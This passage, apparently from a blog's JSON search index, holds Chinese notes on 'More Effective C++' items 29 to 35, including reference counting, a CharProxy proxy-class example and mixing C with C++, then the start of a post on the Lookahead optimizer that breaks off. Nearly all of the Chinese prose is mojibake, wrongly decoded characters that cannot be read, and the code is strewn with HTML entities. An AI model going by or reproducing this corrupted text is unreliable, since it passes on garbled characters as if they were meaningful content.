0ï¼‰çš„å¯¹è±¡å€¼é”€æ¯æ‰ã€‚ ä¸€ä¸ªæˆå‘˜ï¼Œç”¨æ¥è¿½è¸ªèµ„æºæ˜¯å¦â€œå¯å…±äº«â€ï¼Œå¹¶æä¾›æŸ¥è¯¢å…¶å€¼ã€å°†è¯¥æˆå‘˜è®¾ä¸º false ç­‰ç›¸å…³å‡½æ•°ã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹ä¸ºå¯å…±äº«çŠ¶æ€ã€‚ä¸€æ—¦æŸä¸ªå¯¹è±¡è¢«è´´ä¸Šâ€œä¸å¯å…±äº«â€æ ‡ç­¾ï¼Œå°±æ²¡æœ‰åŠæ³•å†æ¢å¤å…¶â€œå¯å…±äº«â€çš„èº«ä»½äº†ã€‚ å…¶ä»– ç®€å•åœ°è¯´ï¼Œä»¥ä¸‹æ˜¯ä½¿ç”¨ reference counting æ”¹å–„æ•ˆç‡çš„æœ€é€‚å½“æ—¶æœºï¼š ç›¸å¯¹å¤šæ•°çš„å¯¹è±¡å…±äº«ç›¸å¯¹å°‘é‡çš„å®å€¼ã€‚è¿™ç§å…±äº«è¡Œä¸ºé€šå¸¸æ˜¯é€šè¿‡assignment operators å’Œ copy constructorsã€‚ å¯¹è±¡å®å€¼çš„äº§ç”Ÿæˆ–é”€æ¯æˆæœ¬å¾ˆé«˜ï¼Œæˆ–æ˜¯èµ„æºå ç”¨å†…å­˜å¾ˆå¤šã€‚è‹¥å®å€¼ï¼ˆèµ„æºï¼‰å¯è¢«å¤šä¸ªå¯¹è±¡å…±äº«ï¼Œreference counting èƒ½å¸¦æ¥è¾ƒé«˜æ”¶ç›Šã€‚ RCObject çš„è®¾è®¡ç›®çš„æ˜¯ç”¨æ¥ä½œä¸ºæœ‰å¼•ç”¨è®¡æ•°èƒ½åŠ›ä¹‹â€œå®å€¼å¯¹è±¡â€çš„åŸºç±»ã€‚ é‚£äº›â€œå®å€¼å¯¹è±¡â€å³å®é™…çš„èµ„æºï¼Œè®¾è®¡ RCPtr smart pointer è¿›è¡Œç®¡ç†ï¼ˆRAIIä¿è¯ï¼‰ã€‚ RCObjectã€RCPtr ä¸åº”è¯¥è¢«å¤–ç•Œçœ‹åˆ°ï¼Œåº”ä¸ºç§æœ‰æˆå‘˜ï¼Œä»¥é™åˆ¶å…¶ç”¨é€”ã€‚ æ¡æ¬¾ 30ï¼šProxy classï¼ˆä»£ç†ç±»ï¼‰ å‡¡â€œç”¨æ¥ä»£è¡¨ï¼ˆè±¡å¾ï¼‰å…¶ä»–å¯¹è±¡â€çš„å¯¹è±¡ï¼Œå¸¸è¢«ç§°ä¸º proxy objectsï¼ˆæ›¿èº«å¯¹è±¡ï¼‰ï¼Œè€Œç”¨ä»¥è¡¨ç° proxy objects è€…ï¼Œæˆ‘ä»¬ç§°ä¸º proxy classã€‚ å½“ class çš„èº«ä»½ä»â€œä¸çœŸå®å¯¹è±¡â€ç§»è½¬åˆ°â€œä¸æ›¿èº«å¯¹è±¡ï¼ˆproxiesï¼‰â€ï¼Œå¾€å¾€ä¼šé€ æˆ class è¯­ä¹‰çš„æ”¹å˜ï¼Œå› ä¸º proxy objects æ‰€å±•ç°çš„è¡Œä¸ºå¸¸å¸¸å’ŒçœŸæ­£å¯¹è±¡çš„è¡Œä¸ºæœ‰äº›éšå¾®å·®å¼‚ã€‚ åœ¨å¾ˆå¤šæƒ…å†µä¸‹ï¼Œproxy å¯¹è±¡å¯ä»¥å®Œç¾æ›¿ä»£å®é™…å¯¹è±¡ã€‚å½“å®ƒä»¬å¯ä»¥å·¥ä½œæ—¶ï¼Œæ„å‘³ç€ä¸¤è€…é—´çš„å·®å¼‚å¹¶ä¸å½±å“ä»€ä¹ˆã€‚ å¤šç»´æ•°ç»„ ä¼˜åŒ–äºŒç»´æ•°ç»„çš„ä½¿ç”¨å½¢å¼ï¼š 12345678910111213141516171819template&lt;class T&gt;class Array2D &#123; public: class Array1D &#123; public: T&amp; operator[](int index); const T&amp; operator[](int index) const; ... &#125;; Array1D operator[](int index); const Array1D operator[](int index) const; ...&#125;;// Array1D ä½¿å¾— data[][] è®¿é—®åˆæ³•ï¼Œå¦åˆ™åªå®ç° Array2D çš„è¯// åŠ¿å¿…åªèƒ½ data(dim1, dim2) è¿™æ ·è°ƒç”¨Array2D&lt;float&gt; data(10, 20);...cout &lt;&lt; data[3][6]; å·¦å€¼/å³å€¼çš„åŒºåˆ† operator[]å¯ä»¥åœ¨ä¸¤ç§ä¸åŒçš„æƒ…å†µä¸‹è°ƒç”¨ï¼šè¯»ä¸€ä¸ªå­—ç¬¦æˆ–å†™ä¸€ä¸ªå­—ç¬¦ã€‚è¯»æ˜¯ä¸ª å³å€¼æ“ä½œï¼›å†™æ˜¯ä¸ªå·¦å€¼æ“ä½œã€‚ï¼ˆè¿™ä¸ªåè¯æ¥è‡ªäºç¼–è¯‘å™¨ï¼Œå·¦å€¼å‡ºç°åœ¨èµ‹å€¼è¿ç®—çš„å·¦è¾¹ï¼Œå³å€¼ å‡ºç°åœ¨èµ‹å€¼è¿ç®—çš„å³è¾¹ã€‚ï¼‰ é€šå¸¸ï¼Œå°†ä¸€ä¸ªå¯¹è±¡åšå·¦å€¼ä½¿ç”¨æ„å‘³ç€å®ƒå¯èƒ½è¢«ä¿®æ”¹ï¼Œåšå³å€¼ç”¨æ„ å‘³ç€å®ƒä¸èƒ½å¤Ÿè¢«ä¿®æ”¹ã€‚ è™½ç„¶æˆ–è®¸ä¸å¯èƒ½çŸ¥é“ operator[] æ˜¯åœ¨å·¦å€¼æˆ–å³å€¼æƒ…å¢ƒä¸‹è¢«è°ƒç”¨ï¼Œæˆ‘ä»¬è¿˜æ˜¯å¯ä»¥åŒºåˆ†è¯»å’Œå†™ã€‚åªè¦å°†å¤„ç†åŠ¨ä½œæ¨è¿Ÿï¼Œç›´è‡³çŸ¥é“ operator[] çš„è¿”å›ç»“æœå°†å¦‚ä½•è¢«ä½¿ç”¨ä¸ºæ­¢ã€‚ï¼ˆlazy evaluationï¼‰ Proxy class å¯æ˜¯å®ç°æ­¤ lazy evaluationã€‚å¯ä»¥ä¿®æ”¹ operator[]ï¼Œä»¤å®ƒè¿”å›å­—ç¬¦ä¸²ä¸­å­—ç¬¦çš„ proxyï¼Œè€Œä¸è¿”å›å­—ç¬¦æœ¬èº«ã€‚ç„¶åç­‰å¾…ï¼Œçœ‹çœ‹è¿™ä¸ª proxy å¦‚ä½•è¢«è¿ç”¨ã€‚å¦‚æœå®ƒè¢«è¯»ï¼Œå°±å°† operator[] çš„è°ƒç”¨åŠ¨ä½œè§†ä¸ºä¸€ä¸ªè¯»å–åŠ¨ä½œã€‚å¦‚æœå®ƒè¢«å†™ï¼Œå°±å°† operator[] çš„è°ƒç”¨è§†ä¸ºä¸€ä¸ªå†™åŠ¨ä½œã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748class String &#123; public: class CharProxy &#123; public: CharProxy(String&amp; str, int index); CharProxy&amp; operator=(const CharProxy&amp; rhs); CharProxy&amp; operator=(char c); operator char() const; private: String&amp; theString; int charIndex; &#125;; const CharProxy operator[](int index) const &#123; return CharProxy(const_cast&lt;String&amp;&gt;(*this), index); &#125; // for const Strings CharProxy operator[](int index) &#123; return CharProxy(*this, index); &#125; // for non-const Strings ... friend class CharProxy; private: // Reference counting ptr RCPtr&lt;StringValue&gt; value;&#125;;String::CharProxy::CharProxy(String&amp; str, int index) : theString(str), charIndex(index) &#123;&#125;String::CharProxy::operator char() const &#123; return theString.value-&gt;data[charIndex];&#125;String::CharProxy::operator=(const CharProxy&amp; rhs) &#123; // copy on write if (theString.value-&gt;isShared()) &#123; theString.value = new StringValue(theString.value-&gt;data); &#125; theString.value-&gt;data[charIndex] = rhs.theString.value-&gt;data[rhs.charIndex]; return *this;&#125;String::CharProxy&amp; String::CharProxy::operator=(char c) &#123; if (theString.value-&gt;isShared()) &#123; theString.value = new StringValue(theString.value-&gt;data); &#125; theString.value-&gt;data[charIndex] = c; return *this;&#125; 123456789101112131415String s1, s2;// è¡¨è¾¾å¼s1[5]è¿”å›çš„æ˜¯ä¸€ CharProxy å¯¹è±¡ã€‚æ²¡æœ‰ä¸ºè¿™æ ·çš„å¯¹è±¡&lt;&lt;æ“ä½œ// åœ¨ CahrProxy ç±»å†…éƒ¨ç”³æ˜äº†ä¸€ä¸ªéšå¼è½¬æ¢åˆ° char çš„æ“ä½œã€‚// è¿™ä¸ª CharProxy-to-char çš„è½¬æ¢æ˜¯ä»£ç†å¯¹è±¡ä½œå³å€¼ä½¿ç”¨æ—¶çš„å…¸å‹è¡Œä¸ºã€‚cout &lt;&lt; s1[5];// è¡¨è¾¾å¼s2[5]è¿”å›çš„æ˜¯ä¸€ä¸ª CharProxy å¯¹è±¡ï¼Œä½œä¸ºèµ‹å€¼æ“ä½œçš„ç›®æ ‡ã€‚ // è°ƒç”¨çš„æ˜¯ CharProxy ç±»ä¸­çš„èµ‹å€¼æ“ä½œã€‚// åœ¨ CharProxy çš„èµ‹å€¼æ“ä½œä¸­ï¼Œè¢«èµ‹å€¼çš„ CharProxy å¯¹è±¡æ˜¯ä½œå·¦å€¼ä½¿ç”¨çš„// proxy ç±»æ‰®æ¼”çš„å­—ç¬¦æ˜¯ä½œå·¦å€¼ä½¿ç”¨çš„s2[5] = 'x';// å·¦è¾¹æ˜¯ä¸€ä¸ªå·¦å€¼ï¼Œå³è¾¹ä¸€ä¸ªä½œå³å€¼s1[3] = s2[8]; æ¡æ¬¾ 31ï¼šè®©å‡½æ•°æ ¹æ®ä¸€ä¸ªä»¥ä¸Šçš„å¯¹è±¡ç±»å‹æ¥å†³å®šå¦‚ä½•è™šåŒ– å‡è®¾ä½ å¿…é¡»ä»¥ C++å®Œæˆä»»åŠ¡ï¼Œä¹Ÿå°±æ˜¯ä½ å¿…é¡»è‡ªè¡Œæƒ³åŠæ³•å®Œæˆä¸Šè¿°éœ€æ±‚ï¼ˆå¸¸è¢«ç§°ä¸º double-dispatchingï¼‰ã€‚æ­¤åç§°æ¥è‡ªé¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ç¤¾åŒºï¼Œåœ¨é‚£ä¸ªé¢†åŸŸé‡Œï¼Œäººä»¬æŠŠä¸€ä¸ªâ€œè™šå‡½æ•°è°ƒç”¨åŠ¨ä½œâ€ç§°ä¸ºä¸€ä¸ªâ€œmessage dispatchâ€ï¼ˆæ¶ˆæ¯åˆ†æ´¾ï¼‰ã€‚ å› æ­¤æŸä¸ªå‡½æ•°è°ƒç”¨å¦‚æœæ ¹æ®ä¸¤ä¸ªå‚æ•°è€Œè™šåŒ–ï¼ˆä¸¤ä¸ªå‚æ•°å‘ç”ŸåŠ¨æ€ç±»å‹ç»‘å®šï¼‰ï¼Œè‡ªç„¶è€Œç„¶åœ°å°±è¢«ç§°ä¸ºâ€œdouble dispatchâ€ã€‚æ›´å¹¿æ³›çš„æƒ…å†µï¼ˆå‡½æ•°æ ¹æ®å¤šä¸ªå‚æ•°è€Œè™šåŒ–ï¼‰åˆ™è¢«ç§°ä¸º multiple dispatchã€‚ è™šå‡½æ•°+ RTTIï¼ˆè¿è¡Œæ—¶æœŸç±»å‹è¾¨è¯†ï¼‰ï¼Œæ ¹æ®ä¸åŒçš„ typeid() ç»“æœï¼Œè¿›è¡Œæ¡ä»¶åˆ¤æ–­å®ç°ä¸åŒå¤„ç†é€»è¾‘ã€‚ åªä½¿ç”¨è™šå‡½æ•°ï¼Œåœ¨ä¸¤ä¸ªç±»å‹ä¸­ï¼Œåˆ†åˆ«æŒ‰ç…§ single dispatch çš„æ–¹å¼å¤„ç†ï¼Œç„¶åç»„åˆä½¿ç”¨ã€‚æ¯”RTTIæ–¹æ³•æ›´å®‰å…¨ã€‚ è‡ªè¡Œä»¿çœŸè™šå‡½æ•°è¡¨æ ¼ï¼ˆVirtual Function Tablesï¼‰ï¼Œç•¥ å…­ã€æ‚é¡¹è®¨è®º æ¡æ¬¾ 32ï¼šåœ¨æœªæ¥æ—¶æ€ä¸‹å‘å±•ç¨‹åº æ‰€è°“åœ¨æœªæ¥æ—¶æ€ä¸‹è®¾è®¡ç¨‹åºï¼Œå°±æ˜¯æ¥å—â€œäº‹æƒ…æ€»ä¼šæ”¹å˜â€çš„äº‹å®ï¼Œå¹¶å‡†å¤‡åº”å¯¹æ–¹æ³•ã€‚ ä¹Ÿè®¸ç¨‹åºåº“ä¼šåŠ å…¥æ–°çš„å‡½æ•°ï¼Œå¯¼è‡´æ–°çš„é‡è½½ï¼ˆoverloadingï¼‰å‘ç”Ÿï¼Œäºæ˜¯å¯¼è‡´æ½œåœ¨çš„æ­§ä¹‰ã€‚ ä¹Ÿè®¸ç»§æ‰¿ä½“ç³»ä¼šåŠ å…¥æ–°çš„ classï¼Œè‡´ä½¿ä»Šå¤©çš„ derived class æˆä¸ºæ˜å¤©çš„ base classã€‚ ä¹Ÿè®¸æ–°çš„åº”ç”¨è½¯ä»¶ä¼šå‡ºç°ï¼Œå‡½æ•°ä¼šåœ¨æ–°çš„ç¯å¢ƒä¸‹è¢«è°ƒç”¨ï¼Œè€Œæˆ‘ä»¬å¿…é¡»è€ƒè™‘é‚£ç§æƒ…å†µä¸‹ä»èƒ½æ­£ç¡®æ‰§è¡Œä»»åŠ¡ã€‚ ç¨‹åºçš„ç»´æŠ¤è€…é€šå¸¸éƒ½ä¸æ˜¯å½“åˆçš„å¼€å‘è€…ï¼Œæ‰€ä»¥è®¾è®¡å’Œå®ç°æ—¶åº”è¯¥æ³¨æ„åˆ°å¦‚ä½•å¸®åŠ©å…¶ä»–äººç†è§£ã€ä¿®æ”¹ã€å¼ºåŒ–ä½ çš„ç¨‹åºã€‚ æœªæ¥å¼æ€ç»´åªä¸è¿‡æ˜¯åŠ ä¸Šä¸€äº›é¢å¤–çš„è€ƒè™‘ï¼š æä¾›å®Œæ•´çš„ classï¼Œå³ä½¿æŸäº›éƒ¨åˆ†ç›®å‰ç”¨ä¸åˆ°ã€‚å½“æ–°çš„éœ€æ±‚è¿›æ¥ï¼Œä½ ä¸å¤ªéœ€è¦å›å¤´å»ä¿®æ”¹é‚£äº› classã€‚ è®¾è®¡ä½ çš„æ¥å£ï¼Œè®©è¿™äº› class è½»æ˜“åœ°è¢«æ­£ç¡®è¿ç”¨ï¼Œéš¾ä»¥è¢«é”™è¯¯è¿ç”¨ã€‚ä¾‹å¦‚ï¼Œé¢å¯¹é‚£äº›â€œcopying å’Œ assignment å¹¶ä¸åˆç†â€çš„ classï¼Œè¯·ç¦æ­¢é‚£äº›åŠ¨ä½œçš„å‘ç”Ÿã€‚ å°½é‡ä½¿ä½ çš„ä»£ç ä¸€èˆ¬åŒ–ï¼ˆæ³›åŒ–ï¼‰ï¼Œé™¤éæœ‰ä¸è‰¯çš„å·¨å¤§åæœã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœä½ æ­£åœ¨å†™ä¸€ä¸ªç®—æ³•ï¼Œç”¨äºæ ‘çŠ¶ç»“æ„ï¼ˆtreeï¼‰çš„æ¥å›éå†ï¼Œè¯·è€ƒè™‘å°†å®ƒä¸€èˆ¬åŒ–ï¼Œä»¥ä¾¿èƒ½å¤Ÿå¤„ç†ä»»ä½•ç§ç±»çš„ directed acyclicï¼ˆéç¯çŠ¶çš„ï¼‰graphã€‚ ä½¿ç”¨è®¾è®¡æ¨¡å¼å°è£…å˜åŒ–ã€‚ æ¡æ¬¾ 33ï¼šå°†éå°¾ç«¯ç±»ï¼ˆnonï½leaf classï¼‰è®¾è®¡ä¸ºæŠ½è±¡ç±»ï¼ˆabstract classï¼‰ å°†å‡½æ•°å£°æ˜ä¸ºçº¯è™šå‡½æ•°ï¼Œå¹¶éæš—ç¤ºå®ƒæ²¡æœ‰å®ç°ï¼Œè€Œæ˜¯æ„å‘³ç€ï¼š ç›®å‰è¿™ä¸ª class æ˜¯æŠ½è±¡çš„ã€‚ ä»»ä½•ç»§æ‰¿æ­¤ class çš„å…·ä½“ç±»ï¼Œéƒ½å¿…é¡»å°†è¯¥çº¯è™šå‡½æ•°é‡æ–°å£°æ˜ä¸ºä¸€ä¸ªæ­£å¸¸çš„è™šå‡½æ•°ï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œä¸å¯ä»¥å†ä»¤å®ƒâ€œ=0â€ï¼‰ã€‚ çš„ç¡®ï¼Œå¤§éƒ¨åˆ†çº¯è™šå‡½æ•°å¹¶æ²¡æœ‰å®ç°ç ï¼Œä½†æ˜¯ pure virtual destructors æ˜¯ä¸ªä¾‹å¤–ã€‚å®ƒä»¬å¿…é¡»è¢«å®ç°å‡ºæ¥ï¼Œå› ä¸ºåªè¦æœ‰ä¸€ä¸ª derived classdestructor è¢«è°ƒç”¨ï¼Œå®ƒä»¬ä¾¿ä¼šè¢«è°ƒç”¨ã€‚æ­¤å¤–ï¼Œå®ƒä»¬é€šå¸¸æ‰§è¡Œä¸€äº›æœ‰ç”¨çš„å·¥ä½œï¼Œå¦‚é‡Šæ”¾èµ„æºæˆ–è®°å½•è¿è½¬æ¶ˆæ¯ç­‰ç­‰ã€‚çº¯è™šå‡½æ•°çš„å®ç°æˆ–è®¸å¹¶ä¸å¸¸è§ï¼Œä½†å¯¹ pure virtual destructors è€Œè¨€ï¼Œå®ç°ä¸ä»…æ˜¯å¹³å¸¸çš„äº‹ï¼Œç”šè‡³æ˜¯å¿…è¦çš„äº‹ã€‚ ä¸€èˆ¬æ€§çš„æ³•åˆ™æ˜¯ï¼šç»§æ‰¿ä½“ç³»ä¸­çš„ non-leafï¼ˆéå°¾ç«¯ï¼‰ç±»åº”è¯¥æ˜¯æŠ½è±¡ç±»ã€‚ æ¡æ¬¾ 34ï¼šå¦‚ä½•åœ¨åŒä¸€ä¸ªç¨‹åºä¸­ç»“åˆ C++å’Œ C æœ‰ 4 ä»¶äº‹æƒ…ä½ éœ€è¦è€ƒè™‘ï¼šname manglingï¼ˆåç§°é‡æ•´ï¼‰ã€staticsï¼ˆé™æ€å¯¹è±¡ï¼‰åˆå§‹åŒ–ã€åŠ¨æ€å†…å­˜åˆ†é…ã€æ•°æ®ç»“æ„çš„å…¼å®¹æ€§ã€‚ Name Manglingï¼ˆåç§°é‡æ•´ï¼‰ Name mangling æ˜¯ä¸€ç§ç¨‹åºã€‚é€šè¿‡å®ƒï¼Œä½ çš„ C++ç¼–è¯‘å™¨ä¸ºç¨‹åºå†…çš„æ¯ä¸€ä¸ªå‡½æ•°ç¼–å‡ºç‹¬ä¸€æ— äºŒçš„åç§°ã€‚åœ¨ C è¯­è¨€ä¸­ï¼Œæ­¤ç¨‹åºå¹¶æ— å¿…è¦ï¼Œå› ä¸ºä½ æ— æ³•å°†å‡½æ•°åç§°é‡è½½ï¼ˆoverloadï¼‰ï¼›ä½†æ˜¯å‡ ä¹æ‰€æœ‰çš„ C++ç¨‹åºéƒ½æœ‰ä¸€äº›å‡½æ•°æ‹¥æœ‰ç›¸åŒçš„åç§°ã€‚ Statics çš„åˆå§‹åŒ– è®¸å¤šä»£ç ä¼šåœ¨ mainä¹‹å‰å’Œä¹‹åæ‰§è¡Œèµ·æ¥ã€‚æ›´æ˜ç¡®åœ°è¯´ï¼Œstatic class å¯¹è±¡ã€å…¨å±€å¯¹è±¡ã€namespace å†…çš„å¯¹è±¡ä»¥åŠæ–‡ä»¶èŒƒå›´ï¼ˆfile scopeï¼‰å†…çš„å¯¹è±¡ï¼Œå…¶ constructors æ€»æ˜¯åœ¨ main ä¹‹å‰å°±è·å¾—æ‰§è¡Œã€‚è¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºstatic initializationã€‚åŒæ ·é“ç†ï¼Œé€šè¿‡ static initialization äº§ç”Ÿå‡ºæ¥çš„å¯¹è±¡ï¼Œå…¶destructors å¿…é¡»åœ¨ static destruction è¿‡ç¨‹ä¸­è¢«è°ƒç”¨ã€‚static destruction å‘ç”Ÿåœ¨ main ç»“æŸä¹‹åã€‚ åŠ¨æ€å†…å­˜åˆ†é… åŠ¨æ€å†…å­˜åˆ†é…çš„ä¸€èˆ¬è§„åˆ™å¾ˆç®€å•ï¼šç¨‹åºçš„ C++éƒ¨åˆ†ä½¿ç”¨ new å’Œdeleteï¼Œç¨‹åºçš„ C éƒ¨åˆ†åˆ™ä½¿ç”¨ mallocï¼ˆåŠå…¶å˜ç§ï¼‰å’Œfreeã€‚åªè¦å†…å­˜æ˜¯ä»¥ new åˆ†é…è€Œå¾—ï¼Œå°±ä»¥ delete åˆ é™¤ã€‚åªè¦å†…å­˜æ˜¯ä»¥ malloc åˆ†é…è€Œå¾—ï¼Œå°±ä»¥ free é‡Šæ”¾ã€‚ æ•°æ®ç»“æ„çš„å…¼å®¹æ€§ ä»æ•°æ®ç»“æ„çš„è§‚ç‚¹æ¥çœ‹ï¼Œæˆ‘ä»¬å¯ä»¥è¯´ï¼šåœ¨ C å’Œ C++ä¹‹é—´å¯¹æ•°æ®ç»“æ„åšåŒå‘äº¤æµï¼Œåº”è¯¥æ˜¯å®‰å…¨çš„â€”â€”å‰ææ˜¯é‚£äº›ç»“æ„çš„å®šä¹‰å¼åœ¨ C å’ŒC++ ä¸­éƒ½å¯ç¼–è¯‘ã€‚ä¸º C++ struct åŠ ä¸Šéè™šå‡½æ•°ï¼Œå¯èƒ½ä¸å½±å“å…¶å…¼å®¹æ€§ï¼›å…¶ä»–ä»»ä½•æ”¹å˜åˆ™å‡ ä¹éƒ½ä¼šå½±å“ã€‚ å‡†åˆ™ å¦‚æœä½ æ‰“ç®—åœ¨åŒä¸€ä¸ªç¨‹åºä¸­æ··ç”¨ C++å’Œ Cï¼Œè¯·è®°ä½ä»¥ä¸‹å‡ ä¸ªç®€å•å®ˆåˆ™ï¼š ç¡®å®šä½ çš„ C++å’Œ C ç¼–è¯‘å™¨äº§å‡ºå…¼å®¹çš„ç›®æ ‡æ–‡ä»¶ï¼ˆobject filesï¼‰ã€‚ å°†åŒæ–¹éƒ½ä½¿ç”¨çš„å‡½æ•°å£°æ˜ä¸º extern ï¼‚Cï¼‚ã€‚ å¦‚æœå¯èƒ½ï¼Œå°½é‡åœ¨ C++ ä¸­æ’°å†™ mainã€‚ æ€»æ˜¯ä»¥ delete åˆ é™¤ newè¿”å›çš„å†…å­˜ï¼›æ€»æ˜¯ä»¥ free é‡Šæ”¾ malloc è¿”å›çš„å†…å­˜ã€‚ å°†ä¸¤ä¸ªè¯­è¨€é—´çš„â€œæ•°æ®ç»“æ„ä¼ é€’â€é™åˆ¶äº C æ‰€èƒ½äº†è§£çš„å½¢å¼ã€‚ æ¡æ¬¾ 35ï¼šè®©è‡ªå·±ä¹ æƒ¯äºæ ‡å‡† C++è¯­è¨€ C++æœ€é‡è¦çš„å‡ é¡¹æ”¹å˜å¦‚ä¸‹æ‰€ç¤ºï¼ˆæ—¶é—´åœ¨C++11ä¹‹å‰ï¼‰ã€‚ å¢åŠ äº†ä¸€äº›æ–°çš„è¯­è¨€ç‰¹æ€§ï¼šRTTIã€namespacesã€boolã€å…³é”®è¯mutable å’Œexplicitã€enums ä½œä¸ºé‡è½½å‡½æ•°ä¹‹è‡ªå˜é‡æ‰€å¼•å‘çš„ç±»å‹æ™‹å‡è½¬æ¢ï¼Œä»¥åŠâ€œåœ¨class å®šä¹‰åŒºå†…ç›´æ¥ä¸ºæ•´æ•°å‹ï¼ˆintegralï¼‰conststatic class members è®¾å®šåˆå€¼â€çš„èƒ½åŠ›ã€‚ æ‰©å……äº† Templates çš„å¼¹æ€§ï¼šå…è®¸ member templates å­˜åœ¨ç­‰ã€‚ å¼ºåŒ–äº†å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼ˆException handlingï¼‰ï¼šç¼–è¯‘æœŸé—´æ›´ä¸¥å¯†åœ°æ£€éªŒ exception specificationsç­‰ã€‚ ä¿®æ”¹äº†å†…å­˜åˆ†é…ä¾‹ç¨‹ï¼šåŠ å…¥ operator new[] å’Œ operator delete[]ï¼Œå†…å­˜æœªèƒ½åˆ†é…æˆåŠŸæ—¶ç”± operator new/new[] æŠ›å‡ºä¸€ä¸ªexceptionï¼Œåœ¨å†…å­˜åˆ†é…å¤±è´¥æ—¶è¿”å› 0ã€‚ å¢åŠ äº†æ–°çš„è½¬å‹å½¢å¼ï¼šstatic_castï¼Œdynamic_castï¼Œconst_cast å’Œreinterpret_castã€‚ è¯­è¨€è§„åˆ™æ›´ä¸ºä¼˜é›…ç²¾ç»ƒï¼šé‡æ–°å®šä¹‰è™šå‡½æ•°æ—¶ï¼Œå…¶è¿”å›ç±»å‹ä¸å†ä¸€å®šå¾—ä¸åŸå®šä¹‰å®Œå…¨å»åˆã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"Book","slug":"Book","permalink":"https://racleray.github.io/tags/Book/"}],"author":"HeRui"},{"title":"å†çœ‹Lookahead","slug":"å†çœ‹Lookahead","date":"2022-04-18T15:22:07.000Z","updated":"2023-08-07T12:02:23.617Z","comments":true,"path":"posts/89ba64e7.html","link":"","permalink":"https://racleray.github.io/posts/89ba64e7.html","excerpt":"è¿™æ˜¯æ‘˜è¦","text":"Lookahead ä¼˜åŒ–å™¨çš„æœ¬è´¨ç›®çš„ï¼š \\[ \\theta_{t+1}=\\theta_{t}+dt*\\nabla L(\\theta) \\] ç®€å•å˜åŒ–ï¼š \\[ \\frac{\\theta_{t+1}-\\theta_{t}}{dt}=\\nabla L(\\theta) \\\\ \\frac{\\partial \\theta}{\\partial t}=\\nabla L(\\theta) \\] t è¡¨ç¤ºtime stepï¼Œè¿™ä¸ªæ¨å¯¼ä¸ä¸¥è°¨ï¼Œä½†æ˜¯è¿™ä¹ˆå†™ä¹Ÿæœ‰ç‚¹é“ç†ã€‚ä¸”å…ˆè¿™ä¹ˆå‡è®¾ã€‚ ä¼˜åŒ–æ±‚è§£çš„è¿‡ç¨‹ï¼Œå°±æ˜¯æ±‚è§£ \\(\\frac{\\partial \\theta}{\\partial t} \\rightarrow 0\\) çš„æœ€ä¼˜å‚æ•°ï¼ˆå±€éƒ¨æœ€ä¼˜ï¼‰çš„è¿‡ç¨‹ï¼Œä¹Ÿå°±æ˜¯å¯¹ \\(\\nabla L(\\theta) \\rightarrow 0\\) çš„ä¼˜åŒ–ã€‚ Lookaheadè¦çš„æ˜¯å•¥ï¼Ÿä¸ä»…è¦æœ€ä¼˜åŒ–çš„å‚æ•°ï¼Œæˆ‘è¿˜è¦å‚æ•°åœ¨æŸå¤±å‡½æ•°ç©ºé—´ä¸­å¤„äºä¸€ä¸ªç›¸å¯¹æ›´ç¨³å®šçš„åŒºåŸŸã€‚ æ€ä¹ˆç¨³å®šï¼Ÿè®©ä¼˜åŒ–å™¨è‡ªå·±è¯•è¯•å‘¨å›´çš„æƒ…å†µï¼Œå¤šæ›´æ–°å‡ æ¬¡ã€‚æ€ä¹ˆå®ç°ï¼Ÿè®¾è®¡ä¸€ä¸ªFunctionï¼ˆè¿‡ç¨‹ï¼‰: \\[ F(\\theta)=\\theta+\\alpha \\nabla L(\\theta) \\] åŒæ—¶ï¼Œä»¤ï¼š \\[ \\frac{\\partial \\theta}{\\partial t} = F^k(\\theta) - \\theta \\rightarrow 0 \\] è¦æ±‚ F çš„ k æ¬¡å¤åˆå‡½æ•°å˜åŒ–ä¹‹åï¼Œèƒ½æ»¡è¶³ä»¥ä¸Šæ¡ä»¶ã€‚ æ­¤æ—¶å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿçœ‹çœ‹ï¼Œ\\(F(\\theta)=\\theta\\) è¿™ç§å˜æ¢æˆç«‹çš„æ—¶å€™ï¼Œ F çš„ k æ¬¡å¤åˆå‡½æ•°å˜åŒ–çš„ç»“æœè¿˜æ˜¯ \\(\\theta\\)ï¼Œå®Œç¾æ»¡è¶³æ¡ä»¶ã€‚ä¹Ÿå‡ å°±æ˜¯è¯´ï¼Œç»è¿‡ k æ¬¡ \\(\\nabla L(\\theta)\\) çš„å˜åŒ–ï¼Œå‚æ•°ä¼šå¤„äºä¸€ä¸ªæ¯”è¾ƒç¨³å®šçš„åŒºåŸŸã€‚ è™½ç„¶æœ‰ç‚¹ç®€åŒ–äº†è¿‡ç¨‹ï¼Œä½†æ˜¯Lookaheadç¡®å®å°±æ˜¯è¿™ä¹ˆä¸ªæ€è·¯ã€‚ ã€‚ã€‚ã€‚ Lookaheadè¿™ä¸ªç®—æ³•æ­é…RAdamå€’æ˜¯è§è¿‡å‡ æ¬¡äº†ã€‚æ„Ÿè§‰ä¸Šï¼Œåº”è¯¥æ˜¯ä¸é”™çš„ã€‚ æ¯•ç«Ÿï¼ŒRAdamç›¸è¾ƒäºå…¶å®ƒè‡ªé€‚åº”å­¦ä¹ ç‡çš„ä¼˜åŒ–å™¨ï¼Œå¯¹äºæ­¥é•¿çš„è®¡ç®—è¿›è¡Œäº†ä¼˜åŒ–ã€‚Lookahead åŒæ—¶é€‰æ‹©ç†è®ºä¸Šå¥½åƒæ›´å¥½çš„æ­¥é•¿ï¼Œæ¯”è¾ƒåœ°NICEã€‚ RAdam ä¸»è¦é’ˆå¯¹ Adam åœ¨è®­ç»ƒåˆå§‹é˜¶æ®µï¼ŒäºŒé˜¶åŠ¨é‡åœ¨ä¸åŒbatchè¾“å…¥æ—¶å¯èƒ½é¢ä¸´æ–¹å·®è¿‡å¤§çš„æƒ…å†µï¼Œå¯¼è‡´è®­ç»ƒä¸ç¨³å®šã€‚Bias-correction 